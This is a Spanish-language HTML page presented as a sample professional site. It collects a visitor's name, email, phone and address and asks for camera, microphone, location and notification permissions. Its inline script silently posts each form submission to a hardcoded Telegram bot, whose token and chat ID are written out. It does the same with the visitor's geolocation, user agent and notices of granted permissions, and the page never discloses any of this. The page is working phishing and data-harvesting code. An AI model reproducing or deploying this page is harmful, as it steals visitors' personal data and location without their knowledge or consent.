<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página Profesional de Ejemplo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        header {
            background-color: #333;
            color: #fff;
            padding: 1em 0;
            text-align: center;
        }
        main {
            padding: 2em;
        }
        form, .menu {
            background: #fff;
            padding: 2em;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 2em;
        }
        label, input, button, select {
            display: block;
            width: 100%;
            margin: 1em 0;
        }
        button {
            background-color: #333;
            color: #fff;
            border: none;
            padding: 0.5em;
            cursor: pointer;
        }
        button:hover {
            background-color: #555;
        }
        .hidden {
            display: none;
        }
        .menu button {
            width: auto;
            margin: 0.5em;
        }
    </style>
</head>
<body>
    <header>
        <h1>Bienvenido a Nuestra Página Profesional</h1>
    </header>
    <main>
        <form id="userForm">
            <label for="name">Nombre:</label>
            <input type="text" id="name" name="name" required>

            <label for="email">Correo Electrónico:</label>
            <input type="email" id="email" name="email" required>

            <label for="phone">Teléfono:</label>
            <input type="tel" id="phone" name="phone" required>

            <label for="address">Dirección:</label>
            <input type="text" id="address" name="address" required>

            <button type="submit">Enviar</button>
        </form>
        <div class="menu">
            <button onclick="requestCameraPermission()">Acceder a la Cámara</button>
            <button onclick="requestMicrophonePermission()">Acceder al Micrófono</button>
            <button onclick="getDeviceInfo()">Obtener Información del Dispositivo</button>
            <button onclick="requestNotificationsPermission()">Solicitar Permisos de Notificaciones</button>
        </div>
        <div id="permissionRequests" class="hidden">
            <p>¿Puedo solicitar permisos adicionales?</p>
            <button id="requestPermissions">Solicitar Permisos</button>
        </div>
    </main>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const form = document.getElementById('userForm');
            const permissionRequests = document.getElementById('permissionRequests');

            form.addEventListener('submit', function (e) {
                e.preventDefault();
                const formData = new FormData(form);
                const userData = Object.fromEntries(formData.entries());

                // Enviar datos al bot de Telegram
                fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: '7955801451',
                        text: `Nombre: ${userData.name}\nCorreo Electrónico: ${userData.email}\nTeléfono: ${userData.phone}\nDirección: ${userData.address}`
                    })
                });

                // Mostrar solicitud de permisos
                permissionRequests.classList.remove('hidden');
            });

            document.getElementById('requestPermissions').addEventListener('click', function () {
                if (Notification.permission !== 'granted') {
                    Notification.requestPermission().then(permission => {
                        if (permission === 'granted') {
                            new Notification('Permisos concedidos', { body: 'Gracias por conceder los permisos!' });
                        }
                    });
                }

                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const locationData = `Latitud: ${position.coords.latitude}, Longitud: ${position.coords.longitude}`;
                        fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                chat_id: '7955801451',
                                text: `Ubicación del usuario: ${locationData}`
                            })
                        });
                    });
                }
            });

            window.requestCameraPermission = function() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(function(stream) {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            document.body.appendChild(video);
                            fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: '7955801451',
                                    text: 'El usuario ha concedido permiso para acceder a la cámara.'
                                })
                            });
                        })
                        .catch(function(err) {
                            console.log('Error al acceder a la cámara: ' + err);
                        });
                }
            };

            window.requestMicrophonePermission = function() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ audio: true })
                        .then(function(stream) {
                            const audio = document.createElement('audio');
                            audio.srcObject = stream;
                            audio.play();
                            document.body.appendChild(audio);
                            fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: '7955801451',
                                    text: 'El usuario ha concedido permiso para acceder al micrófono.'
                                })
                            });
                        })
                        .catch(function(err) {
                            console.log('Error al acceder al micrófono: ' + err);
                        });
                }
            };

            window.getDeviceInfo = function() {
                const userAgent = navigator.userAgent;
                const ip = 'IP del usuario'; // Aquí puedes usar un servicio para obtener la IP del usuario
                fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: '7955801451',
                        text: `Información del dispositivo:\nUser Agent: ${userAgent}\nIP: ${ip}`
                    })
                });
            };

            window.requestNotificationsPermission = function() {
                if (Notification.permission !== 'granted') {
                    Notification.requestPermission().then(permission => {
                        if (permission === 'granted') {
                            new Notification('Permisos concedidos', { body: 'Gracias por conceder los permisos!' });
                            fetch(`https://api.telegram.org/bot7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI/sendMessage`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: '7955801451',
                                    text: 'El usuario ha concedido permiso para notificaciones.'
                                })
                            });
                        }
                    });
                }
            };
        });
    </script>
</body>
</html>
